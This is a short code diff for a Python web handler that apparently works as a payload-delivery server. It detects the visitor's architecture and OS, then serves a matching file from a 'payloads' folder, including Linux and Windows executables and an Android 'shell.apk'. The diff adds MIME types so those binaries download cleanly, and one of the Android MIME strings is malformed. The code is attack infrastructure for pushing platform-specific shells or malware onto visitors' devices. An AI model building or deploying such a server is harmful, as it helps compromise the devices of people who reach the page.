@@ -41,28 +41,35 @@ def index():
 
     #variable for filepath to payload
     filepath = ""
+    mimetype = ""
+
 
     #set filepath with 
     if arch_os_pattern == "x64 linux":
         filepath = "payloads/linux_x64"
+        mimetype = "application/x-executable"
     
     if arch_os_pattern == "x64 windows":
         filepath = "payloads/windows_x64"
+        mimetype = "application/x-ms-dos-executable"
     
     if arch_os_pattern == "x64 android":
         filepath = "payloads/shell.apk"
+        mimetype = "application/application/vnd.android.package-archive"
     
     if arch_os_pattern == "x86 linux":
         filepath = "payloads/linux_x86"
+        mimetype = "application/x-executable"
     
     if arch_os_pattern == "x86 windows":
         filepath = "payloads/windows_x86"
-    
+        mimetype = "application/x-ms-dos-executable"
+
     if arch_os_pattern == "x86 android":
         filepath = "payloads/shell.apk"
-    
+        mimetype = "application/application/vnd.android.package-archive"
     #send set payload
     if filepath == "":
         return "Error"
     else:
-        return send_file(filepath)
+        return send_file(filepath, mimetype=mimetype)
